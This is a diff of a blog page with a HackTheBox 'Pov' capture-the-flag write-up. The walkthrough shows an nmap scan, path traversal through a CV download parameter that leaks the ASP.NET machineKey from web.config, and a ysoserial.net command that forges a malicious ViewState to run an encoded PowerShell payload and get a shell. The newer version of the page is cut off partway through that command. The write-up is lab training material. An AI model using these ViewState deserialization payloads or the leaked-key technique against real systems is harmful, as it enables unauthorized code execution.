@@ -1,239 +1,32 @@
-<!DOCTYPE html>
-<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="content-type" content="text/html">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title itemprop="name">HTB: Pov | kanyo&#39;s blog</title>
-<meta property="og:title" content="HTB: Pov | kanyo&#39;s blog" />
-<meta name="twitter:title" content="HTB: Pov | kanyo&#39;s blog" />
-<meta itemprop="name" content="HTB: Pov | kanyo&#39;s blog" />
-<meta name="application-name" content="HTB: Pov | kanyo&#39;s blog" />
-<meta property="og:site_name" content="" />
-
-<meta name="description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out.">
-<meta itemprop="description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out." />
-<meta property="og:description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out." />
-<meta name="twitter:description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out." />
-
-<meta property="og:locale" content="en-gb" />
-<meta name="language" content="en-gb" />
-
-  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-pov/" title="English" />
-
-
-
-
-
-
-<meta name="generator" content="Hugo 0.161.1">
-
-    
-    <meta property="og:url" content="http://localhost:1313/writeups/htb-pov/">
-  <meta property="og:site_name" content="kanyo&#39;s blog">
-  <meta property="og:title" content="HTB: Pov">
-  <meta property="og:description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out.">
-  <meta property="og:locale" content="en_gb">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2026-06-07T00:00:00+00:00">
-    <meta property="article:modified_time" content="2026-06-07T00:00:00+00:00">
-    <meta property="article:tag" content="Ppid">
-    <meta property="article:tag" content="Aspnet">
-    <meta property="article:tag" content="Runas">
-    <meta property="article:tag" content="Windows">
-
-
-    
-    
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="HTB: Pov">
-  <meta name="twitter:description" content="A Medium Windows box where an LFI in a dev subdomain&#39;s CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out.">
-
-
-    
-
-    <link rel="canonical" href="http://localhost:1313/writeups/htb-pov/">
-    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
-    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
-
-    
-    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
-    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
-    <link rel="shortcut icon" href="/favicon.ico">
-
-
-
-
-<link rel="manifest" href="http://localhost:1313/site.webmanifest">
-
-<meta name="msapplication-config" content="/browserconfig.xml">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#434648">
-
-    
-    
-</head>
-<body data-theme = "dark" class="notransition">
-
-<script src="/js/theme.js"></script>
-
-<div class="navbar" role="navigation">
-    <nav class="menu" aria-label="Main Navigation">
-        <a href="http://localhost:1313/" class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
-viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
-stroke-linejoin="round" class="feather feather-home">
-<title>Home</title>
-<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
-<polyline points="9 22 9 12 15 12 15 22"></polyline>
-</svg>
-        </a>
-        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
-        <label for="menu-trigger">
-            <span class="menu-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
-            </span>
-        </label>
-
-        <div class="trigger">
-            <ul class="trigger-container">
-                
-                
-                <li>
-                    <a class="menu-link " href="/">
-                        Home
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/blogs/">
-                        Blogs
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link active" href="/writeups/">
-                        Writeups
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="/about/">
-                        About
-                    </a>
-                    
-                </li>
-                
-                <li>
-                    <a class="menu-link " href="https://notes.chaelsoo.me">
-                        Cheatsheet
-                    </a>
-                    
-                </li>
-                
-                <li class="menu-separator">
-                    <span>|</span>
-                </li>
-                
-                
-            </ul>
-            <a id="mode" href="#">
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
-<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
-            </a>
-        </div>
-    </nav>
-</div>
-
-<div class="wrapper post">
-    <main class="page-content" aria-label="Content">
-        <article>
-            <header class="header">
-                <h1 class="header-title">HTB: Pov</h1>
-                
-                
-                
-                <div class="post-meta">
-                    <time datetime="2026-06-07T00:00:00&#43;00:00" itemprop="datePublished"> 7 Jun 2026 </time>
-                </div>
-                
-            </header>
-            
-            <img src="/images/writeups/htb-pov/htb-pov-pwned.png" alt="HTB: Pov" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
-            
-            <div class="toc-container">
-    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
-    <div class="toc-content" id="tocContent">
-        <nav id="TableOfContents">
-  <ul>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#lfi-and-the-machinekey">LFI and the machineKey</a></li>
-    <li><a href="#pscredential-xml-sfitz-to-alaading">PSCredential XML: sfitz to alaading</a></li>
-    <li><a href="#sedebugprivilege-parent-pid-spoofing">SeDebugPrivilege: Parent PID Spoofing</a></li>
-  </ul>
-</nav>
-    </div>
-</div>
-
-<div class="mini-toc" id="miniToc">
-    <div class="mini-toc-header">
-        <div class="mini-toc-title">Contents</div>
-        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
-            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
-            </svg>
-        </button>
-    </div>
-    <div class="mini-toc-content" id="miniTocContent"></div>
-</div>
-            <div class="page-content">
-                <p>Windows box, only port 80. The main site drops a subdomain in the contact section, and that subdomain has a portfolio with a CV download feature that doesn&rsquo;t sanitize the file path. Reading <code>web.config</code> through that LFI leaks the ASP.NET machineKey. From there the attack is elegant: the machineKey signs and encrypts ViewState, so with it you can forge a malicious ViewState that the server deserializes as trusted, and deserialization in .NET gives you code execution. The second half is about SeDebugPrivilege and parent PID spoofing, a technique that lets you inherit a SYSTEM token without touching lsass.</p>
-<h2 id="recon">Recon</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/pov ❯ sudo nmap -sV -sC -T4 10.129.17.128
-</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-07 19:51 +0100
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.17.128
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.070s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">999</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">80/tcp open  http    Microsoft IIS httpd 10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: pov.htb
-</span></span><span class="line"><span class="cl">Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>One port. The main site at <code>pov.htb</code> was a personal portfolio, a frontend with no interactive functionality. The contact section was the useful part:</p>
-<p><img src="/images/writeups/htb-pov/web-contact-subdomain-hint.png" alt="pov.htb contact page with text pointing to dev.pov.htb subdomain and sfitz@pov.htb email"></p>
-<p><code>dev.pov.htb</code> spelled out in the page text, <code>sfitz@pov.htb</code> as the contact email. Added both to <code>/etc/hosts</code> and moved to the subdomain.</p>
-<h2 id="lfi-and-the-machinekey">LFI and the machineKey</h2>
-<p><code>dev.pov.htb</code> was a separate portfolio site. It had a &ldquo;Download CV&rdquo; button that sent a POST request with a <code>file</code> parameter. Taking it to Burp and changing the filename to a relative path showed it would load any file the web process could read:</p>
-<p><img src="/images/writeups/htb-pov/burp-lfi-download-cv-request.png" alt="Burp Suite POST request to dev.pov.htb triggering the file parameter LFI"></p>
-<p>The obvious target in an ASP.NET application is <code>web.config</code>. This is the application&rsquo;s main configuration file, database connection strings, custom settings, and crucially the <code>machineKey</code> element that controls how the app handles cryptographic operations.</p>
-<p>Requesting <code>../../web.config</code> through the LFI gave this response:</p>
-<p><img src="/images/writeups/htb-pov/burp-webconfig-machinekey-leak.png" alt="Burp Suite response showing leaked web.config with ASP.NET machineKey decryption and validation keys"></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;machineKey</span> <span class="na">decryption=</span><span class="s">&#34;AES&#34;</span> 
-</span></span><span class="line"><span class="cl">  <span class="na">decryptionKey=</span><span class="s">&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> 
-</span></span><span class="line"><span class="cl">  <span class="na">validation=</span><span class="s">&#34;SHA1&#34;</span> 
-</span></span><span class="line"><span class="cl">  <span class="na">validationKey=</span><span class="s">&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class="nt">/&gt;</span>
-</span></span></code></pre></div><p>Here is what makes this key dangerous. ASP.NET uses a mechanism called <code>__VIEWSTATE</code> to preserve page state between requests. When you submit a form, the browser sends back a hidden field containing a base64-encoded blob that represents the state of every control on the page, which dropdown was selected, what was in a text field, and so on. To prevent clients from tampering with this blob (injecting different values, for example), ASP.NET signs and encrypts it using the machineKey before sending it to the browser, and verifies that signature before deserializing it on the way back in.</p>
-<p>The catch is the deserialization step. ASP.NET deserializes the ViewState blob using the .NET BinaryFormatter, which is a general-purpose object serializer. If you can forge a ViewState that passes the signature check, which you can, because you have the key, you can embed a .NET deserialization gadget chain inside it. When the server deserializes the blob, the gadget chain executes arbitrary code in the context of the IIS worker process.</p>
-<p><code>ysoserial.net</code> handles the gadget chain and the ViewState signing in one step. Built it locally, then generated the payload:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\t</span>ools<span class="se">\y</span>soserial.net&gt; ysoserial.exe -p ViewState <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  -g WindowsIdentity <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  -c <span class="s2">&#34;powershell -e </span><span class="nv">$b64</span><span class="s2">&#34;</span> <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  --decryptionalg<span class="o">=</span><span class="s2">&#34;AES&#34;</span> <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  --decryptionkey<span class="o">=</span><span class="s2">&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  --validationalg<span class="o">=</span><span class="s2">&#34;SHA1&#34;</span> <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  --validationkey<span class="o">=</span><span class="s2">&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class="sb">`</span>
-</span></span><span class="line"><span class="cl">  --path<span class="o">=</span><span class="s2">&#34;/portfolio&#34;</span>
-</span></span></code></pre></div><p>Sent the forged ViewState in the <code>__VIEWSTATE</code> parameter to the portfolio page and got a shell back. <code>whoami /all</code> on the resulting shell:</p>
-<pre tabindex="0"><code>whoami /all
+<!doctype html><html lang=en-gb><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>HTB: Pov | kanyo's blog</title><meta property="og:title" content="HTB: Pov | kanyo's blog"><meta name=twitter:title content="HTB: Pov | kanyo's blog"><meta itemprop=name content="HTB: Pov | kanyo's blog"><meta name=application-name content="HTB: Pov | kanyo's blog"><meta property="og:site_name" content><meta name=description content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><meta itemprop=description content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><meta property="og:description" content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><meta name=twitter:description content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><meta property="og:locale" content="en-gb"><meta name=language content="en-gb"><link rel=alternate hreflang=en-gb href=https://chaelsoo.me/writeups/htb-pov/ title=English><meta name=generator content="Hugo 0.161.1"><meta property="og:url" content="https://chaelsoo.me/writeups/htb-pov/"><meta property="og:site_name" content="kanyo's blog"><meta property="og:title" content="HTB: Pov"><meta property="og:description" content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><meta property="og:locale" content="en_gb"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2026-06-07T00:00:00+00:00"><meta property="article:modified_time" content="2026-06-07T00:00:00+00:00"><meta property="article:tag" content="Ppid"><meta property="article:tag" content="Aspnet"><meta property="article:tag" content="Runas"><meta property="article:tag" content="Windows"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB: Pov"><meta name=twitter:description content="A Medium Windows box where an LFI in a dev subdomain's CV download feature leaks the ASP.NET machineKey. Forging a malicious ViewState gets code execution, and SeDebugPrivilege with parent PID spoofing closes it out."><link rel=canonical href=https://chaelsoo.me/writeups/htb-pov/><link href=/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/icons/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/icons/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/icons/favicon-16x16.png><link rel=mask-icon href=/icons/safari-pinned-tab.svg><link rel="shortcut icon" href=/favicon.ico><link rel=manifest href=https://chaelsoo.me/site.webmanifest><meta name=msapplication-config content="/browserconfig.xml"><meta name=msapplication-TileColor content="#2d89ef"><meta name=theme-color content="#434648"></head><body data-theme=dark class=notransition><script src=/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=https://chaelsoo.me/ class=logo><svg width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+</a><input type=checkbox id=menu-trigger class=menu-trigger>
+<label for=menu-trigger><span class=menu-icon><svg width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class=menu-link href=/blogs/>Blogs</a></li><li><a class="menu-link active" href=/writeups/>Writeups</a></li><li><a class=menu-link href=/about/>About</a></li><li><a class=menu-link href=https://notes.chaelsoo.me>Cheatsheet</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg>
+<svg class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post"><main class=page-content aria-label=Content><article><header class=header><h1 class=header-title>HTB: Pov</h1><div class=post-meta><time datetime=2026-06-07T00:00:00+00:00 itemprop=datePublished>7 Jun 2026</time></div></header><img src=/images/writeups/htb-pov/htb-pov-pwned.png alt="HTB: Pov" style="width:100%;border-radius:.5rem;margin:1.5rem 0"><div class=toc-container><button class=toc-toggle type=button onclick=toggleToc()>Table of Contents</button><div class=toc-content id=tocContent><nav id=TableOfContents><ul><li><a href=#recon>Recon</a></li><li><a href=#lfi-and-the-machinekey>LFI and the machineKey</a></li><li><a href=#pscredential-xml-sfitz-to-alaading>PSCredential XML: sfitz to alaading</a></li><li><a href=#sedebugprivilege-parent-pid-spoofing>SeDebugPrivilege: Parent PID Spoofing</a></li></ul></nav></div></div><div class=mini-toc id=miniToc><div class=mini-toc-header><div class=mini-toc-title>Contents</div><button class=mini-toc-minimize type=button onclick=toggleMiniToc() aria-label="Minimize TOC">
+<svg fill="currentColor" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M1 8a.5.5.0 01.5-.5h13a.5.5.0 010 1h-13A.5.5.0 011 8zM7.646 4.146a.5.5.0 01.708.0l2 2a.5.5.0 01-.708.708L8.5 5.707V11.5a.5.5.0 01-1 0V5.707L6.354 6.854a.5.5.0 11-.708-.708l2-2z"/></svg></button></div><div class=mini-toc-content id=miniTocContent></div></div><div class=page-content><p>Windows box, only port 80. The main site drops a subdomain in the contact section, and that subdomain has a portfolio with a CV download feature that doesn&rsquo;t sanitize the file path. Reading <code>web.config</code> through that LFI leaks the ASP.NET machineKey. From there the attack is elegant: the machineKey signs and encrypts ViewState, so with it you can forge a malicious ViewState that the server deserializes as trusted, and deserialization in .NET gives you code execution. The second half is about SeDebugPrivilege and parent PID spoofing, a technique that lets you inherit a SYSTEM token without touching lsass.</p><h2 id=recon>Recon</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/labs/pov ❯ sudo nmap -sV -sC -T4 10.129.17.128
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-06-07 19:51 +0100
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.17.128
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.070s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>999</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>80/tcp open  http    Microsoft IIS httpd 10.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: pov.htb
+</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>One port. The main site at <code>pov.htb</code> was a personal portfolio, a frontend with no interactive functionality. The contact section was the useful part:</p><p><img src=/images/writeups/htb-pov/web-contact-subdomain-hint.png alt="pov.htb contact page with text pointing to dev.pov.htb subdomain and sfitz@pov.htb email"></p><p><code>dev.pov.htb</code> spelled out in the page text, <code>sfitz@pov.htb</code> as the contact email. Added both to <code>/etc/hosts</code> and moved to the subdomain.</p><h2 id=lfi-and-the-machinekey>LFI and the machineKey</h2><p><code>dev.pov.htb</code> was a separate portfolio site. It had a &ldquo;Download CV&rdquo; button that sent a POST request with a <code>file</code> parameter. Taking it to Burp and changing the filename to a relative path showed it would load any file the web process could read:</p><p><img src=/images/writeups/htb-pov/burp-lfi-download-cv-request.png alt="Burp Suite POST request to dev.pov.htb triggering the file parameter LFI"></p><p>The obvious target in an ASP.NET application is <code>web.config</code>. This is the application&rsquo;s main configuration file, database connection strings, custom settings, and crucially the <code>machineKey</code> element that controls how the app handles cryptographic operations.</p><p>Requesting <code>../../web.config</code> through the LFI gave this response:</p><p><img src=/images/writeups/htb-pov/burp-webconfig-machinekey-leak.png alt="Burp Suite response showing leaked web.config with ASP.NET machineKey decryption and validation keys"></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;machineKey</span> <span class=na>decryption=</span><span class=s>&#34;AES&#34;</span> 
+</span></span><span class=line><span class=cl>  <span class=na>decryptionKey=</span><span class=s>&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34;</span> 
+</span></span><span class=line><span class=cl>  <span class=na>validation=</span><span class=s>&#34;SHA1&#34;</span> 
+</span></span><span class=line><span class=cl>  <span class=na>validationKey=</span><span class=s>&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34;</span> <span class=nt>/&gt;</span>
+</span></span></code></pre></div><p>Here is what makes this key dangerous. ASP.NET uses a mechanism called <code>__VIEWSTATE</code> to preserve page state between requests. When you submit a form, the browser sends back a hidden field containing a base64-encoded blob that represents the state of every control on the page, which dropdown was selected, what was in a text field, and so on. To prevent clients from tampering with this blob (injecting different values, for example), ASP.NET signs and encrypts it using the machineKey before sending it to the browser, and verifies that signature before deserializing it on the way back in.</p><p>The catch is the deserialization step. ASP.NET deserializes the ViewState blob using the .NET BinaryFormatter, which is a general-purpose object serializer. If you can forge a ViewState that passes the signature check, which you can, because you have the key, you can embed a .NET deserialization gadget chain inside it. When the server deserializes the blob, the gadget chain executes arbitrary code in the context of the IIS worker process.</p><p><code>ysoserial.net</code> handles the gadget chain and the ViewState signing in one step. Built it locally, then generated the payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PS C:<span class=se>\t</span>ools<span class=se>\y</span>soserial.net&gt; ysoserial.exe -p ViewState <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  -g WindowsIdentity <span class=sb>`</span>
+</span></span><span class=line><span class=cl>  -c <span class=s2>&#34;powershell -e </span><span class=nv>$b64</span><span class=s2>&#34;</span> <span class=sb>`</span>
